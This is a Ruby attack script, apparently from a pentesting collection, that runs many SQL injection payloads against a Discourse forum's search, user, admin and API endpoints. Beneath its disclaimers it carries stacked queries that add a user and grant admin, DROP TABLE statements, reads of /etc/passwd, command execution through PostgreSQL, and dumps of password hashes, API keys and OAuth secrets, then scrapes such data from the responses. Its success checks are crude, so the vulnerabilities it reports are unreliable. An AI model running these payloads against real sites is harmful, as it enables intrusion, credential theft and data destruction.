#!/usr/bin/env ruby

# Discourse SQL Injection Exploits
# Comprehensive SQL injection testing for Discourse forums
# For educational and authorized testing purposes only
#
# Author: ibrahimsql
# Date: 2025
# Purpose: Educational and authorized penetration testing only
#
# WARNING: Use only on systems you own or have explicit permission to test!

require 'net/http'
require 'uri'
require 'json'
require 'openssl'
require 'base64'
require 'nokogiri'
require 'time'

class DiscourseSQLInjection
  def initialize(target_url, options = {})
    @target_url = target_url.chomp('/')
    @timeout = options[:timeout] || 10
    @proxy = options[:proxy]
    @user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    @csrf_token = nil
    @session_cookies = {}
    @results = {
      vulnerable: false,
      vulnerabilities: [],
      extracted_data: [],
      summary: {
        total_tests: 0,
        successful_tests: 0,
        critical_vulns: 0,
        high_vulns: 0,
        medium_vulns: 0
      }
    }
  end

  def run_all_tests
    puts "ðŸš€ Starting Discourse SQL Injection Testing"
    puts "Target: #{@target_url}"
    puts "=" * 60

    # Get CSRF token
    get_csrf_token

    # Test different injection points
    test_search_sqli
    test_user_sqli
    test_category_sqli
    test_admin_sqli
    test_api_sqli
    test_advanced_sqli

    # Print results
    print_results
    save_results

    @results
  end

  private

  def get_csrf_token
    begin
      uri = URI("#{@target_url}/")
      response = make_request(uri)
      
      if response && response.body
        doc = Nokogiri::HTML(response.body)
        csrf_meta = doc.at_css('meta[name="csrf-token"]')
        @csrf_token = csrf_meta['content'] if csrf_meta
        
        # Extract session cookies
        response.get_fields('set-cookie')&.each do |cookie|
          cookie_parts = cookie.split(';')[0].split('=')
          @session_cookies[cookie_parts[0]] = cookie_parts[1] if cookie_parts.length == 2
        end
      end
    rescue => e
      puts "[!] Error getting CSRF token: #{e.message}"
    end
  end

  def test_search_sqli
    puts "[*] Testing search functionality for SQL injection..."
    
    search_payloads = [
      # Basic injection tests
      "' OR 1=1--",
      "' OR '1'='1",
      "' OR 1=1#",
      "' OR 1=1/*",
      "\" OR 1=1--",
      "\" OR \"1\"=\"1",
      
      # Union-based injection
      "' UNION SELECT 1,2,3,4,5--",
      "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
      "' UNION SELECT version(),user(),database(),@@version,@@datadir--",
      "' UNION SELECT table_name,column_name,1,2,3 FROM information_schema.columns--",
      
      # Time-based blind injection
      "' OR (SELECT SLEEP(5))--",
      "' OR (SELECT pg_sleep(5))--",
      "' OR (SELECT COUNT(*) FROM pg_stat_activity WHERE pg_sleep(5) IS NOT NULL)--",
      "'; WAITFOR DELAY '00:00:05'--",
      
      # Boolean-based blind injection
      "' AND (SELECT SUBSTRING(version(),1,1))='P'--",
      "' AND (SELECT COUNT(*) FROM users)>0--",
      "' AND (SELECT LENGTH(current_database()))>0--",
      
      # Error-based injection
      "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
      "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
      "' AND CAST((SELECT version()) AS INT)--",
      
      # PostgreSQL specific
      "' AND (SELECT * FROM generate_series(1,1000000))--",
      "' UNION SELECT NULL,NULL,NULL,NULL,current_database()--",
      "' UNION SELECT NULL,NULL,NULL,NULL,current_user--",
      "' UNION SELECT NULL,NULL,NULL,NULL,inet_server_addr()--"
    ]

    search_endpoints = ['/search', '/search/query']
    
    search_endpoints.each do |endpoint|
      search_payloads.each do |payload|
        test_sqli_endpoint(endpoint, 'q', payload, 'search')
        sleep(0.5)
      end
    end
  end

  def test_user_sqli
    puts "[*] Testing user functionality for SQL injection..."
    
    user_payloads = [
      "admin' OR 1=1--",
      "admin' UNION SELECT username,email,password_hash,salt,admin FROM users--",
      "admin' AND (SELECT COUNT(*) FROM users WHERE admin=true)>0--",
      "admin'; DROP TABLE users--",
      "admin' OR (SELECT pg_sleep(5))--"
    ]

    user_endpoints = [
      '/u/',
      '/users/',
      '/admin/users',
      '/user_avatar/',
      '/users/check_username'
    ]
    
    user_endpoints.each do |endpoint|
      user_payloads.each do |payload|
        test_sqli_endpoint(endpoint, 'username', payload, 'user')
        sleep(0.5)
      end
    end
  end

  def test_category_sqli
    puts "[*] Testing category functionality for SQL injection..."
    
    category_payloads = [
      "1' OR 1=1--",
      "1' UNION SELECT id,name,description,slug,color FROM categories--",
      "1' AND (SELECT COUNT(*) FROM categories)>0--",
      "1' OR (SELECT pg_sleep(3))--"
    ]

    category_endpoints = [
      '/c/',
      '/categories',
      '/category/',
      '/admin/customize/site_texts'
    ]
    
    category_endpoints.each do |endpoint|
      category_payloads.each do |payload|
        test_sqli_endpoint(endpoint, 'category_id', payload, 'category')
        sleep(0.5)
      end
    end
  end

  def test_admin_sqli
    puts "[*] Testing admin functionality for SQL injection..."
    
    admin_payloads = [
      "1' OR 1=1--",
      "1' UNION SELECT key,value,data_type,created_at,updated_at FROM site_settings--",
      "1' UNION SELECT username,email,admin,moderator,created_at FROM users WHERE admin=true--",
      "1' UNION SELECT client_id,client_secret,redirect_uri,scopes,name FROM oauth_applications--",
      "1' OR (SELECT pg_sleep(5))--"
    ]

    admin_endpoints = [
      '/admin/users',
      '/admin/logs',
      '/admin/api',
      '/admin/customize',
      '/admin/site_settings',
      '/admin/backups'
    ]
    
    admin_endpoints.each do |endpoint|
      admin_payloads.each do |payload|
        test_sqli_endpoint(endpoint, 'id', payload, 'admin')
        sleep(0.5)
      end
    end
  end

  def test_api_sqli
    puts "[*] Testing API endpoints for SQL injection..."
    
    api_payloads = [
      "1' OR 1=1--",
      "1' UNION SELECT api_key,user_id,created_at,revoked_at,description FROM api_keys--",
      "1' AND (SELECT COUNT(*) FROM api_keys WHERE revoked_at IS NULL)>0--",
      "1' OR (SELECT pg_sleep(4))--"
    ]

    api_endpoints = [
      '/posts',
      '/topics',
      '/categories.json',
      '/users.json',
      '/notifications.json',
      '/admin/api/keys.json'
    ]
    
    api_endpoints.each do |endpoint|
      api_payloads.each do |payload|
        test_sqli_endpoint(endpoint, 'id', payload, 'api')
        sleep(0.5)
      end
    end
  end

  def test_advanced_sqli
    puts "[*] Testing advanced SQL injection techniques..."
    
    advanced_payloads = [
      # Stacked queries
      "'; INSERT INTO users (username, email) VALUES ('hacker', 'hacker@evil.com')--",
      "'; UPDATE users SET admin = true WHERE username = 'admin'--",
      "'; DROP TABLE IF EXISTS temp_table--",
      
      # File operations (PostgreSQL)
      "' UNION SELECT pg_read_file('/etc/passwd'),NULL,NULL,NULL,NULL--",
      "' UNION SELECT pg_ls_dir('.'),NULL,NULL,NULL,NULL--",
      
      # Command execution (PostgreSQL)
      "'; COPY (SELECT '') TO PROGRAM 'id'--",
      "'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT--",
      
      # Database enumeration
      "' UNION SELECT table_name,column_name,data_type,is_nullable,column_default FROM information_schema.columns WHERE table_schema=current_database()--",
      "' UNION SELECT schemaname,tablename,tableowner,tablespace,hasindexes FROM pg_tables--",
      
      # User enumeration
      "' UNION SELECT username,email,created_at,admin,moderator FROM users--",
      "' UNION SELECT name,value,NULL,NULL,NULL FROM site_settings--",
      
      # API key extraction
      "' UNION SELECT key,user_id,created_at,revoked_at,description FROM api_keys--",
      "' UNION SELECT client_id,client_secret,redirect_uri,scopes,NULL FROM oauth_applications--"
    ]

    advanced_endpoints = ['/search', '/admin/users', '/posts']
    
    advanced_endpoints.each do |endpoint|
      advanced_payloads.each do |payload|
        test_sqli_endpoint(endpoint, 'q', payload, 'advanced')
        sleep(1)
      end
    end
  end

  def test_sqli_endpoint(endpoint, param, payload, test_type)
    begin
      @results[:summary][:total_tests] += 1
      
      # Test GET request
      test_url = "#{@target_url}#{endpoint}?#{param}=#{URI.encode_www_form_component(payload)}"
      
      start_time = Time.now
      response = make_request(URI(test_url))
      response_time = Time.now - start_time
      
      if response && check_sqli_success(response, payload, response_time)
        vulnerability = {
          type: 'SQL Injection',
          severity: determine_severity(payload, response),
          endpoint: endpoint,
          parameter: param,
          payload: payload,
          method: 'GET',
          test_type: test_type,
          evidence: extract_sqli_evidence(response, payload),
          timestamp: Time.now.iso8601
        }
        
        @results[:vulnerable] = true
        @results[:vulnerabilities] << vulnerability
        @results[:summary][:successful_tests] += 1
        
        case vulnerability[:severity]
        when 'Critical'
          @results[:summary][:critical_vulns] += 1
        when 'High'
          @results[:summary][:high_vulns] += 1
        when 'Medium'
          @results[:summary][:medium_vulns] += 1
        end
        
        puts "[+] SQL injection found: #{endpoint} (#{test_type})"
        
        # Extract sensitive data if possible
        extracted_data = extract_sensitive_data(response.body)
        @results[:extracted_data].concat(extracted_data) if extracted_data.any?
      end
      
      # Test POST request
      if endpoint != '/search'  # Avoid duplicate search tests
        test_post_sqli(endpoint, param, payload, test_type)
      end
      
    rescue => e
      puts "[!] Error testing #{endpoint}: #{e.message}"
    end
  end

  def test_post_sqli(endpoint, param, payload, test_type)
    begin
      url = "#{@target_url}#{endpoint}"
      form_data = { param => payload }
      
      start_time = Time.now
      response = make_post_request(url, form_data)
      response_time = Time.now - start_time
      
      if response && check_sqli_success(response, payload, response_time)
        vulnerability = {
          type: 'SQL Injection',
          severity: determine_severity(payload, response),
          endpoint: endpoint,
          parameter: param,
          payload: payload,
          method: 'POST',
          test_type: test_type,
          evidence: extract_sqli_evidence(response, payload),
          timestamp: Time.now.iso8601
        }
        
        @results[:vulnerable] = true
        @results[:vulnerabilities] << vulnerability
        @results[:summary][:successful_tests] += 1
        
        puts "[+] SQL injection found (POST): #{endpoint} (#{test_type})"
      end
      
    rescue => e
      # Continue testing
    end
  end

  def check_sqli_success(response, payload, response_time)
    return false unless response
    
    content = response.body.downcase
    
    # SQL error indicators
    sql_errors = [
      'syntax error', 'mysql_fetch', 'ora-01756', 'microsoft ole db',
      'postgresql', 'warning: mysql', 'valid mysql result', 'mysqlclient',
      'postgresql query failed', 'pg_query', 'pg_exec', 'pg_fetch',
      'column count doesn\'t match', 'operand should contain 1 column',
      'the used select statements have different number of columns',
      'table doesn\'t exist', 'unknown column', 'ambiguous column name',
      'invalid column name', 'must declare the scalar variable',
      'unclosed quotation mark', 'quoted string not properly terminated',
      'division by zero', 'data type mismatch', 'conversion failed'
    ]
    
    # Check for SQL errors
    sql_errors.each do |error|
      return true if content.include?(error)
    end
    
    # Check for time-based injection
    if payload.include?('sleep') || payload.include?('waitfor')
      return true if response_time > 4
    end
    
    # Check for union injection success
    if payload.include?('union')
      union_indicators = ['version()', 'user()', 'database()', '@@version', 'current_database', 'current_user']
      union_indicators.each do |indicator|
        return true if content.include?(indicator.downcase)
      end
    end
    
    # Check for boolean-based injection
    if payload.include?('and') || payload.include?('or')
      # Look for different response patterns
      return true if response.code.to_i == 200 && content.length > 1000
    end
    
    # Check response status
    return true if response.code.to_i == 500
    
    false
  end

  def determine_severity(payload, response)
    content = response.body.downcase
    
    # Critical: Data extraction or command execution
    if payload.include?('union') && (content.include?('admin') || content.include?('password') || content.include?('api_key'))
      return 'Critical'
    end
    
    if payload.include?('pg_read_file') || payload.include?('copy') || payload.include?('system')
      return 'Critical'
    end
    
    # High: Database enumeration or user data access
    if payload.include?('information_schema') || payload.include?('pg_tables') || payload.include?('users')
      return 'High'
    end
    
    # Medium: Basic injection
    'Medium'
  end

  def extract_sqli_evidence(response, payload)
    evidence = []
    content = response.body
    
    # Extract database version
    version_match = content.match(/PostgreSQL\s+([\d\.]+)/i)
    evidence << "Database version: #{version_match[1]}" if version_match
    
    # Extract error messages
    error_match = content.match(/(ERROR|Warning|Fatal):\s*([^\n]+)/i)
    evidence << "Error message: #{error_match[2]}" if error_match
    
    # Extract SQL query fragments
    query_match = content.match(/SELECT\s+[^\n]+/i)
    evidence << "Query fragment: #{query_match[0]}" if query_match
    
    evidence
  end

  def extract_sensitive_data(content)
    extracted = []
    
    # Extract emails
    emails = content.scan(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/)
    emails.each { |email| extracted << "Email: #{email}" }
    
    # Extract potential passwords/hashes
    hashes = content.scan(/\$2[aby]\$[0-9]{2}\$[A-Za-z0-9.\/]{53}/)
    hashes.each { |hash| extracted << "Password hash: #{hash}" }
    
    # Extract API keys
    api_keys = content.scan(/[a-f0-9]{32,64}/)
    api_keys.each { |key| extracted << "API key: #{key}" }
    
    # Extract usernames
    usernames = content.scan(/"username"\s*:\s*"([^"]+)"/)
    usernames.each { |username| extracted << "Username: #{username[0]}" }
    
    # Extract database names
    db_names = content.scan(/"database"\s*:\s*"([^"]+)"/)
    db_names.each { |db| extracted << "Database: #{db[0]}" }
    
    extracted.uniq
  end

  def make_request(uri, method = 'GET', body = nil, headers = {})
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    http.read_timeout = @timeout
    
    # Set up proxy if provided
    if @proxy
      proxy_uri = URI(@proxy)
      http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
    end
    
    request = case method.upcase
              when 'GET'
                Net::HTTP::Get.new(uri)
              when 'POST'
                Net::HTTP::Post.new(uri)
              else
                Net::HTTP::Get.new(uri)
              end
    
    # Set headers
    request['User-Agent'] = @user_agent
    request['Accept'] = 'application/json, text/javascript, */*; q=0.01'
    request['Accept-Language'] = 'en-US,en;q=0.9'
    
    # Add session cookies
    if !@session_cookies.empty?
      cookie_string = @session_cookies.map { |k, v| "#{k}=#{v}" }.join('; ')
      request['Cookie'] = cookie_string
    end
    
    # Add custom headers
    headers.each { |k, v| request[k] = v }
    
    # Set body for POST requests
    if body && method.upcase == 'POST'
      request.body = body
      request['Content-Type'] = 'application/x-www-form-urlencoded'
    end
    
    begin
      response = http.request(request)
      
      # Update session cookies
      response.get_fields('set-cookie')&.each do |cookie|
        cookie_parts = cookie.split(';')[0].split('=')
        @session_cookies[cookie_parts[0]] = cookie_parts[1] if cookie_parts.length == 2
      end
      
      response
    rescue => e
      puts "[!] Request failed: #{e.message}"
      nil
    end
  end

  def make_post_request(url, form_data)
    uri = URI(url)
    body = URI.encode_www_form(form_data)
    
    make_request(uri, 'POST', body, {
      'X-CSRF-Token' => @csrf_token || '',
      'X-Requested-With' => 'XMLHttpRequest'
    })
  end

  def print_results
    puts "\n" + "=" * 60
    puts "DISCOURSE SQL INJECTION TEST RESULTS"
    puts "=" * 60
    puts "Target: #{@target_url}"
    puts "Vulnerable: #{@results[:vulnerable] ? 'YES' : 'NO'}"
    puts "Total Tests: #{@results[:summary][:total_tests]}"
    puts "Successful Tests: #{@results[:summary][:successful_tests]}"
    puts "Critical Vulnerabilities: #{@results[:summary][:critical_vulns]}"
    puts "High Vulnerabilities: #{@results[:summary][:high_vulns]}"
    puts "Medium Vulnerabilities: #{@results[:summary][:medium_vulns]}"
    
    if @results[:vulnerabilities].any?
      puts "\nVulnerabilities Found:"
      @results[:vulnerabilities].each_with_index do |vuln, index|
        puts "  #{index + 1}. #{vuln[:severity]} - #{vuln[:endpoint]} (#{vuln[:parameter]})"
        puts "     Payload: #{vuln[:payload][0..80]}..."
        puts "     Method: #{vuln[:method]}"
        puts "     Evidence: #{vuln[:evidence].join(', ')}" if vuln[:evidence].any?
      end
    end
    
    if @results[:extracted_data].any?
      puts "\nExtracted Data:"
      @results[:extracted_data].each { |data| puts "  - #{data}" }
    end
  end

  def save_results
    filename = 'discourse_sql_injection_results.json'
    File.write(filename, JSON.pretty_generate(@results))
    puts "\n[*] Results saved to #{filename}"
  end
end

# Main execution
if __FILE__ == $0
  require 'optparse'
  
  options = {}
  OptionParser.new do |opts|
    opts.banner = "Discourse SQL Injection Exploit Suite\n\n"
    opts.banner += "Usage: ruby discourse_sql_injection.rb [options] TARGET_URL\n\n"
    
    opts.on('--proxy PROXY', 'Proxy URL (e.g., http://127.0.0.1:8080)') do |proxy|
      options[:proxy] = proxy
    end
    
    opts.on('--timeout TIMEOUT', Integer, 'Request timeout (default: 10)') do |timeout|
      options[:timeout] = timeout
    end
    
    opts.on('-h', '--help', 'Show this help') do
      puts opts
      puts "\nExample:"
      puts "  ruby discourse_sql_injection.rb https://discourse.example.com"
      puts "\nWARNING: Use only on systems you own or have explicit permission to test!"
      exit
    end
  end.parse!
  
  if ARGV.empty?
    puts "Error: Target URL required"
    puts "Use --help for usage information"
    exit 1
  end
  
  target_url = ARGV[0]
  
  begin
    exploit = DiscourseSQLInjection.new(target_url, options)
    results = exploit.run_all_tests
    
    if results[:vulnerable]
      puts "\nðŸš¨ CRITICAL: SQL injection vulnerabilities found!"
      puts "   Database access and data extraction possible!"
    else
      puts "\nâœ… No SQL injection vulnerabilities detected"
    end
    
  rescue Interrupt
    puts "\n[!] Testing interrupted by user"
  rescue => e
    puts "\n[!] Testing failed: #{e.message}"
  end
end